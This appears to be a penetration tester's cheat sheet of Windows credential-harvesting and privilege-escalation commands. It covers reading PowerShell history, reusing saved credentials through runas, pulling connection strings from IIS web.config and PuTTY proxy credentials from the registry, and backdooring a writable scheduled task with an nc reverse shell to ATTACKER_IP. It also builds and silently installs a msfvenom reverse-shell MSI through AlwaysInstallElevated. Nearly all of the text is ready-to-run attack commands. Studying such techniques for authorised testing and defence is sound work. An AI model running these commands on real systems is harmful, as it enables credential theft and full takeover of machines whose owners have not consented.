### Harvesting Password
  #### Powershell History　　－　in cmd
    type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
    // To read the file from Powershell, you'd have to replace %userprofile% with $Env:userprofile. 

  #### Saved Windows Credentials
    cmdkey /list
    //runas to view a username in the list, nad launch a cmd
    runas /savecred /user:xxx cmd.exe

  #### IIS Configuration
    type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
    or C:\inetpub\wwwroot\web.config

  #### Retrieve Credentials from Software: PuTTY
    reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s  
      // Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.
  #### Scheduled Tasks
    schtasks
    schtasks /query /tn vulntask /fo list /v //to view a particular task

    icacls c:\tasks\xxx  //to view the privi, F is full access

    //if yes we can modify it as a backdoor,
    echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
    schtasks /run /tn vulntask  //run immediately
  
  #### AlwaysInstallElevated  
    msi files can be configured to run with higher privileges from any user account (even unprivileged ones)
      //enable below 2 values
    C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
    C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
    //msf create revershell msi, should also run the Metasploit Handler module configured accordingly
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi

     msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
